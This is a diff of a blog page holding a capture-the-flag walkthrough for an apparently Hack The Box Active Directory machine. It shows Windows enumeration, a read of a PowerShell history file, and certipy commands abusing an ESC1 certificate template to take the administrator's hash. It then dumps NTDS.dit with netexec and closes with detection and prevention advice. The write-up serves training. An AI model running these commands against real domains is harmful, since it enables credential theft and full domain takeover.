+<li><strong>I try and gather basic</strong> <code>systeminfo</code> <strong>but am denied</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-211944_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="installed-program-enumeration">Installed Program Enumeration:</h4>
+<ul>
+<li><strong>I list all the installed programs by querying the registry keys using powershell</strong>:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:&gt; (<span style="color:#e6db74">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>, <span style="color:#e6db74">&#39;HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-Table -AutoSize
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DisplayName                                                        DisplayVersion  InstallLocation
+</span></span><span style="display:flex;"><span>-----------                                                        --------------  ---------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> (<span style="color:#ae81ff">64</span>-bit)
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> (<span style="color:#ae81ff">64</span>-bit)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Common Files                                       <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> Setup (English)                          <span style="color:#ae81ff">15.0</span>.4013.40
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> XEvent                                             <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> XEvent                                             <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> SQL Diagnostics                                    <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft VSS Writer <span style="color:#66d9ef">for</span> SQL Server <span style="color:#ae81ff">2019</span>                           <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> T-SQL Language Service                   <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> RsFx Driver                              <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Common Files                                       <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Shared                             <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects                          <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X64 Minimum Runtime - <span style="color:#ae81ff">14.29</span>.30133        <span style="color:#ae81ff">14.29</span>.30133
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> DMF                                                <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft ODBC Driver <span style="color:#ae81ff">17</span> <span style="color:#66d9ef">for</span> SQL Server                            <span style="color:#ae81ff">17.7</span>.2.1
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects Extensions               <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Connection Info                                    <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft OLE DB Driver <span style="color:#66d9ef">for</span> SQL Server                             <span style="color:#ae81ff">18.5</span>.0.0
+</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2012</span> Native Client                            <span style="color:#ae81ff">11.4</span>.7462.6
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Services                           <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects                          <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects Extensions               <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>VMware Tools                                                       <span style="color:#ae81ff">12.0</span>.6.20104755 C:\Program Files\VMware\VMware Tools\
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Batch Parser                                       <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Shared                             <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Services                           <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X64 Additional Runtime - <span style="color:#ae81ff">14.29</span>.30133     <span style="color:#ae81ff">14.29</span>.30133
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> DMF                                                <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Connection Info                                    <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2015</span>-<span style="color:#ae81ff">2019</span> Redistributable (x64) - <span style="color:#ae81ff">14.29</span>.30133 <span style="color:#ae81ff">14.29</span>.30133.0
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2015</span>-<span style="color:#ae81ff">2019</span> Redistributable (x86) - <span style="color:#ae81ff">14.29</span>.30133 <span style="color:#ae81ff">14.29</span>.30133.0
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X86 Additional Runtime - <span style="color:#ae81ff">14.29</span>.30133     <span style="color:#ae81ff">14.29</span>.30133
+</span></span><span style="display:flex;"><span>Browser <span style="color:#66d9ef">for</span> SQL Server <span style="color:#ae81ff">2019</span>                                        <span style="color:#ae81ff">15.0</span>.2000.5
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> x86 Minimum Runtime - <span style="color:#ae81ff">12.0</span>.40664         <span style="color:#ae81ff">12.0</span>.40664
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> Redistributable (x86) - <span style="color:#ae81ff">12.0</span>.40664       <span style="color:#ae81ff">12.0</span>.40664.0
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> x86 Additional Runtime - <span style="color:#ae81ff">12.0</span>.40664      <span style="color:#ae81ff">12.0</span>.40664
+</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X86 Minimum Runtime - <span style="color:#ae81ff">14.29</span>.30133        <span style="color:#ae81ff">14.29</span>.<span style="color:#ae81ff">30133</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>The only thing that looks interesting here is the VMWare install, however that could just be for the box to run.</li>
+</ul>
+<h4 id="path-enumeration">Path Enumeration:</h4>
+<ul>
+<li><strong>I enumerate the</strong> <code>PATH</code>:
+<ul>
+<li><code>$Env:PATH</code>
+<ul>
+<li>I see that there is an installation of <code>OpenSSH</code> here:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-213528_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="drive-enumeration">Drive Enumeration:</h4>
+<ul>
+<li><strong>I check for any other mounted drives</strong>:
+<ul>
+<li><code>get-PSdrive</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-213703_.png">
+</figure>
+</li>
+<li>What is interesting here is <code>Cert</code>, certificates can be used as a valid attack path.</li>
+</ul>
+</li>
+</ul>
+<h4 id="scheduled-task-enumeration">Scheduled Task Enumeration:</h4>
+<ul>
+<li><strong>I check for scheduled tasks</strong>:
+<ul>
+<li><code>Get-ScheduledTask | select TaskName,State</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-213931_.png">
+</figure>
+</li>
+<li>It is denied, however I can use <code>schtasks</code>, save the output and inspect later:
+<ul>
+<li><code>schtasks /query /fo LIST /v &gt; tasks.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-214202_.png">
+</figure>
+</li>
+<li>This provides ALOT of data, so we need to be smart with how we process it. At the moment I have kept it for later.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="powershell-history-enumeration">Powershell History Enumeration:</h4>
+<ul>
+<li><strong>I try and check his powershell history file</strong>:
+<ul>
+<li><code>Cat C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Get-ChildItem -Path &quot;$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&quot; | Format-Table -AutoSize</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="network-enumeration">Network Enumeration:</h4>
+<ul>
+<li>
+<p><strong>I check to see if we are listening or presenting any interesting services</strong>:</p>
+<ul>
+<li><code>netstat -nao</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-132616_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Arp Table Enumeration</strong>:</p>
+<ul>
+<li><code>arp -a</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-133159_.png">
+</figure>
+</li>
+<li>There are some other hosts listed here, however as far as I am aware this is the only target for this engagement as it&rsquo;s a single box, unless we are presenting different services on different nics &amp; they have seperate IP&rsquo;s.</li>
+</ul>
+</li>
+<li>
+<p><strong>NIC enumeration</strong>:</p>
+<ul>
+<li><code>ipconfig /all</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-133327_.png">
+</figure>
+</li>
+<li>I check for additional NICS but there is nothing, so the entries in the arp table I imagine are part of HTB&rsquo;s infrastructure.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the routing table</strong>:</p>
+<ul>
+<li><code>route print</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-133517_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I attempt to enumerate network shares but I am denied</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-133615_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check for VPN connections</strong>:</p>
+<ul>
+<li><code>rasdial</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-134610_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="service-process-enumeration">Service/Process Enumeration:</h4>
+<ul>
+<li>
+<p><strong>I attempt to list all processes running</strong>:</p>
+<ul>
+<li>I try with <code>tasklist /svc</code> &amp; with <code>wmic process list full</code> but I am denied.</li>
+<li><figure><img src="/ox-hugo/2024-10-05-134800_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and enumerate services using powershell</strong>:</p>
+<ul>
+<li><code>get-service</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-135020_.png">
+</figure>
+</li>
+<li>It fails as I suspect, however we can also check services with <code>evil-winrm</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Listing running services using</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-135154_.png">
+</figure>
+</li>
+<li>There are 3 services running with Privs, but 2 are Defender and the other is a standard windows component, so not hijackable as far as I am aware.</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-the-password-policy">Enumerating the password policy:</h4>
+<ul>
+<li><strong>Enumerating the password policy</strong>:
+<ul>
+<li><code>net accounts</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-135455_.png">
+</figure>
+</li>
+<li>Nothing of note</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-if-the-dc-is-vulnerable-to-any-certificate-privilege-escalation-techniques-dot">Enumerating if the DC is vulnerable to any certificate privilege escalation techniques.</h4>
+<ul>
+<li>
+<p><strong>I use</strong> <a href="https://github.com/ly4k/Certipy">certipy</a> <strong>to check if the DC is vulnerable</strong>:</p>
+<ul>
+<li><code>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-141826_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Reading the report it says the DC is vulnerable to the</strong> <a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1">ESC1</a> <strong>attack path</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-141931_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-esc1-attack-chain-to-elevate-privileges-to-administrator">Using ESC1 Attack Chain to elevate privileges to Administrator:</h3>
 <ol>
-<li></li>
+<li>
+<p><strong>I retrieve the certificate template name from the file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-151236_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I sync my clock</strong>:</p>
+<ul>
+<li><code>sudo ntpdate -s sequel.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-152616_.png">
+</figure>
+
+<ul>
+<li><del>Note</del>:
+<ul>
+<li>If you see the below error this is most likely down to your attack host clock being too out of sync with the target. (Picture taken from a previous box where I learned the hard way)</li>
+<li><figure><img src="/ox-hugo/2024-09-21-201233_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I request a cert</strong>:</p>
+<ul>
+<li><code>certipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-150245_.png">
+</figure>
+</li>
+<li><del>Note</del>: How we have used the name of the certificate we found in step 1 <code>UserAuthentication</code></li>
+<li><del>!!!SUCESS!!!</del></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I request to authenticate as the Administrator and retrieve the Administrator NT hash &amp; creds stored in</strong> <code>.ccache</code>:</p>
+<ul>
+<li><code>certipy-ad auth -pfx administrator_dc.pfx -dc-ip $box</code></li>
+<li>We have both the administrator hash as well as the creds stored in <code>.ccache</code> which we can use Kerberos authentication with.</li>
+<li><figure><img src="/ox-hugo/2024-10-05-150539_.png">
+</figure>
+</li>
+</ul>
+</li>
 </ol>
+<h4 id="attack-deep-dive-e-dot-g-exploiting-upn-s-in-esc1-attacks-a-hackers-guide">Attack Deep-Dive e.g Exploiting UPN&rsquo;s in ESC1 Attacks: A Hackers Guide:</h4>
+<ul>
+<li>
+<p><strong>What&rsquo;s a UPN and Why Do We Care?</strong></p>
+<ul>
+<li>First things first: <code>UPN</code> stands for User Principal Name (UPN). They&rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here&rsquo;s why they&rsquo;re so important:
+<ol>
+<li>They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension.</li>
+<li>They link certificates to specific Active Directory accounts.</li>
+<li>They enable certificate mapping for authentication.</li>
+<li>They facilitate Single Sign-On (SSO) scenarios.</li>
+<li>They&rsquo;re used in smart card logons.</li>
+<li>Sometimes, they even correspond to email addresses.</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Now onto the attack</strong>:</p>
+<ul>
+<li>ESC1 is one of the most fundamental certificate-based attack vectors in Active Directory environments. It occurs when a certificate template allows for client authentication and is configured with dangerous enrollment permissions. Here&rsquo;s why it matters:
+<ul>
+<li>It&rsquo;s incredibly common in enterprise environments</li>
+<li>Often overlooked during security assessments</li>
+<li>Can lead to complete domain compromise (like in this case)</li>
+<li>Relatively simple to execute</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The ESC1 Attack: Your Gateway to Domain Admin Privileges</strong>:</p>
+<ul>
+<li>The ESC1 attack path revolves around a misconfigured certificate template that grants excessive enrollment permissions. Here&rsquo;s the breakdown:
+<ol>
+<li>We discover a template that allows client authentication (like the User template)</li>
+<li>We notice that low-privileged users (like Domain Users) have enrollment rights</li>
+<li>We request a certificate using this template</li>
+<li>We can now authenticate to services that accept certificate-based authentication</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>From Certificate to Domain Access</strong>:</p>
+<ul>
+<li>But wait, you might ask, &ldquo;How do we actually leverage this certificate for privilege escalation?&rdquo; Great question! Here&rsquo;s the step-by-step process:
+<ul>
+<li>
+<p>First, we identify vulnerable templates:</p>
+<ul>
+<li>Look for templates that allow client authentication</li>
+<li>Check if Domain Users can enroll</li>
+<li>Verify the template is enabled</li>
+</ul>
+</li>
+<li>
+<p><strong>We request and obtain our certificate</strong>:</p>
+<ul>
+<li>Using Certipy</li>
+<li>The certificate is valid and trusted within the domain</li>
+</ul>
+</li>
+<li>
+<p><strong>Here&rsquo;s where the magic happens</strong>:</p>
+<ul>
+<li>We can now authenticate to services that accept certificate auth</li>
+<li><del>Note</del>: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a <code>.cacche</code> file so we can then perform PTT attacks from the comfort of our attack box.</li>
+</ul>
+</li>
+<li>
+<p><strong>Privilege escalation opportunities</strong>:</p>
+<ul>
+<li>Authenticate as a the privielged user with their hash.</li>
+<li>Authentication to sensitive services</li>
+<li>Potential for further certificate template abuse</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Why This Attack Vector is Significant</strong>:</p>
+<ul>
+<li><strong>Widespread Impact</strong>: Many organizations use default certificate templates</li>
+<li><strong>Persistence</strong>: Certificates typically have long validity periods
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-153645_.png">
+</figure>
+</li>
+<li>This one is valide for 99 years!!!</li>
+</ul>
+</li>
+<li><strong>Stealth Factor</strong>: Certificate-based authentication generates fewer logs</li>
+<li><strong>Chain Reaction</strong>: Can be combined with other ESC attacks for greater impact</li>
+</ul>
+</li>
+<li>
+<p><strong>Detection and Prevention</strong>:</p>
+<ol>
+<li>Audit certificate template permissions regularly</li>
+<li>Restrict enrollment rights to necessary users only</li>
+<li>Disable unused certificate templates</li>
+<li>Monitor certificate request patterns</li>
+<li>Implement proper template security settings</li>
+</ol>
+</li>
+<li>
+<p><strong>Tools of the Trade</strong>:</p>
+<ul>
+<li><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1">Certipy</a>: Your Swiss Army knife for certificate attacks</li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a>: Built-in Windows tool for certificate operations</li>
+</ul>
+</li>
+<li>
+<p><strong>Remember</strong>: ESC1 might seem basic, but it&rsquo;s often the first step in a more complex attack chain. Don&rsquo;t underestimate its potential impact on your Active Directory security posture!</p>
+</li>
+</ul>
 <h2 id="4-dot-ownership">4. Ownership:</h2>
-<h2 id="5-dot-persistence">5. Persistence:</h2>
+<h3 id="dumping-ntds-dot-dit-database">Dumping <code>NTDS.dit</code> database:</h3>
+<ul>
+<li><strong>Dumping NTDS for ownership</strong>:
+<ul>
+<li><code>netexec smb $box -u $user -H $hash -M ntdsutil</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-151008_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="loading-dot-ccache-into-the-krb5ccname-variable-to-authenticate">Loading <code>.ccache</code> into the <code>KRB5CCNAME</code> Variable to Authenticate:</h3>
+<ul>
+<li>
+<p><strong>I load the</strong> <code>.ccache</code> <strong>into the</strong> <code>KRB5CCNAME</code> <strong>Variable</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-05-154134_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check it&rsquo;s valid</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u administrator --use-kcache --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-05-154254_.png">
+</figure>
+</li>
+<li>It is, we can now authenticate with kerberos.</li>
+</ul>
+</li>
+</ul>
 <h2 id="lessons-learned">Lessons Learned:</h2>
 <h3 id="what-did-i-learn">What did I learn?</h3>
 <ol>
-<li></li>
-<li></li>
-<li></li>
+<li>I hadn&rsquo;t actually used the ESC1 attack vector before only ESC7 in <a href="https://bloodstiller.com/walkthroughs/manager-box/">https://bloodstiller.com/walkthroughs/manager-box/</a>, so it was cool to that.</li>
+<li>I learned about netexec displaying <code>guest</code> when a random username and password is supplied as a way to show that guest logon is accepted on the target.</li>
+<li>I learned to always re-check my tools. That mistake with <code>evil-winrm</code> was silly.</li>
 </ol>
 <h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
 <ol>
-<li></li>
-<li></li>
+<li>See point 3 above.</li>
+<li>Oh I also tried to use the wrong certificate name when initially doing the exploit, copy &amp; paste always!</li>
 </ol>
 <h2 id="sign-off">Sign off:</h2>
 <p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
 <p>Until next time, hack the planet!</p>
 <p>– Bloodstiller</p>
 <p>– Get in touch bloodstiller at proton dot me</p>
-<h2 id="9c69d6"><del>CREDS</del>:</h2>
-<h3 id="ssh-keys">SSH Keys:</h3>
-<h3 id="compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</h3>
-<h4 id="usernames">Usernames:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
-<h4 id="passwords">Passwords:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
-<h4 id="username-and-pass">Username &amp; Pass:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
-<h4 id="hashes">Hashes:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
 
             
         </div>
@@ -1142,7 +2183,7 @@ Unfortunately we get no hits:</p>
                 <li>
                     
                         Word Count:
-                        1603
+                        5013
                     
                 </li>
             
@@ -1178,7 +2219,7 @@ Unfortunately we get no hits:</p>
                     
                         Last modified: &nbsp;
                         <time>
-                            Oct 04 2024 00:00:00
+                            Oct 05 2024 00:00:00
                         </time>
                     
                 </li>
